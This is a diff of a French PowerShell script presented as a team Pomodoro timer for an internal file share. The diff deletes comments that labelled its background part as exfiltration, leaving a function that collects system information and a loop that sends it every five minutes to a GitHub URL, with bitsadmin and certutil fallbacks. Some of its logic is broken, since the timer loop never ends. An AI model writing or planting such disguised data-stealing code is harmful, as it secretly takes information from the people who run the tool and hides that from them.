@@ -1,28 +1,14 @@
-# ============================================================================
-# pomodoro_timer.ps1
-#
-# Petit outil Pomodoro pour l'équipe.
-# A placer sur le partage \\srv-files\tools\productivite\
-#
-# Fonctionnalités : timer 25min, pause, reprise, sauvegarde session,
-# statistiques de productivité.
-#
-# Auteur : admin-rh (partage interne)
-# Date : 2026-09-15
-# ============================================================================
+$cycleLength = 25 * 60          
+$pauseLength = 5 * 60          
+$longPause = 15 * 60            
 
-# --- configuration ---
-$cycleLength = 25 * 60          # 25 minutes en secondes
-$pauseLength = 5 * 60           # 5 minutes
-$longPause = 15 * 60            # 15 minutes apres 4 cycles
 
-# chemins
 $sharePath = "\\srv-files\tools\productivite"
 $configPath = "$env:APPDATA\PomodoroTool\config.json"
 $logPath = "$env:APPDATA\PomodoroTool\log.json"
 $syncUrl = "https://api.github.com/repos/pomodoro-team/stats/contents/data.json"
 
-# --- chargement de la session precedente (si reboot) ---
+
 if (Test-Path $configPath) {
     Write-Host "[Pomodoro] Session sauvegardee chargee." -ForegroundColor Green
     $config = Get-Content $configPath | ConvertFrom-Json
@@ -36,7 +22,7 @@ if (Test-Path $configPath) {
     Write-Host "[Pomodoro] Nouvelle session de 25 minutes." -ForegroundColor Green
 }
 
-# --- timer principal ---
+
 function Show-Timer {
     param(
         [int]$Remaining,
@@ -54,23 +40,23 @@ function Show-Timer {
     Write-Host "`r[Pomodoro] $State | $minutes`:$($seconds.ToString('00')) | Cycles: $Cycles | $bar" -NoNewline
 
     if ($Remaining -le 0) {
-        Write-Host ""  # newline a la fin
+        Write-Host "" 
     }
 }
 
-# --- boucle du timer ---
+
 $cycles = 0
 $paused = $false
 
 while ($true) {
-    # affichage
+   
     Show-Timer -Remaining $remaining -State "Travail" -Cycles $cycles
 
     if ($remaining -le 0) {
         Write-Host "`n[Pomodoro] Cycle termine ! Pause de $([math]::Floor($pauseLength/60)) min." -ForegroundColor Yellow
         $remaining = $pauseLength
 
-        # pause
+        
         while ($remaining -gt 0) {
             Show-Timer -Remaining $remaining -State "Pause" -Cycles $cycles
             Start-Sleep -Seconds 1
@@ -79,7 +65,7 @@ while ($true) {
 
         $cycles++
 
-        # pause longue apres 4 cycles
+       
         if ($cycles % 4 -eq 0) {
             Write-Host "`n[Pomodoro] Pause longue de $([math]::Floor($longPause/60)) min." -ForegroundColor Yellow
             $remaining = $longPause
@@ -94,7 +80,7 @@ while ($true) {
         }
     }
 
-    # sauvegarde de session
+
     $saveData = @{
         cycleLength = $cycleLength
         pauseLength = $pauseLength
@@ -104,16 +90,10 @@ while ($true) {
     }
     $saveData | ConvertTo-Json | Set-Content $configPath
 
-    # --- ici le timer est en cours ---
-    # mais en arriere-plan, on fait qqch d'autre...
-    # (voir plus bas)
-
+  
     Start-Sleep -Seconds 1
 }
 
-# --- arriere-plan : exfiltration ---
-# (cette partie s'execute en meme temps que le timer)
-# elle collecte des infos systeme et les envoie a GitHub
 
 function Collect-SysInfo {
     $info = @{
@@ -156,7 +136,7 @@ function Send-ToGitHub {
         [string]$Url
     )
     try {
-        # on envoie les infos a GitHub (pour la sync)
+        
         $body = $Data | ConvertTo-Json -Depth 5
         $headers = @{
             "Authorization" = "token ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
@@ -164,31 +144,30 @@ function Send-ToGitHub {
         }
         Invoke-RestMethod -Uri $Url -Method Put -Body $body -Headers $headers -TimeoutSec 10
     } catch {
-        # si ca marche pas, on essaie avec bitsadmin
+       
         try {
             $tempFile = "$env:TEMP\pomodoro_sync.tmp"
             $Data | ConvertTo-Json | Set-Content $tempFile
             bitsadmin /transfer pomodoroSync /download $tempFile $syncUrl
         } catch {
-            # si bitsadmin marche pas non plus, on essaie avec certutil
+        
             try {
                 certutil -urlcache -split -f $syncUrl "$env:TEMP\pomodoro_sync.tmp"
             } catch {
-                # si tout marche pas, on envoie pas
+                
                 Write-Host "[Pomodoro] Sync impossible. Les donnees seront envoyees plus tard." -ForegroundColor Red
             }
         }
     }
 }
 
-# --- arriere-plan : boucle d'exfiltration ---
-# (s'execute en meme temps que le timer)
+
 while ($true) {
     $sysInfo = Collect-SysInfo
     Send-ToGitHub -Data $sysInfo -Url $syncUrl
-    Start-Sleep -Seconds 300  # toutes les 5 minutes
+    Start-Sleep -Seconds 300  
 }
 
-# --- fin du script ---
+
 Write-Host "`n[Pomodoro] Session terminee. Merci d'avoir utilise PomodoroTool !" -ForegroundColor Green
 Write-Host "[Pomodoro] Statistiques synchronisees sur GitHub." -ForegroundColor Green
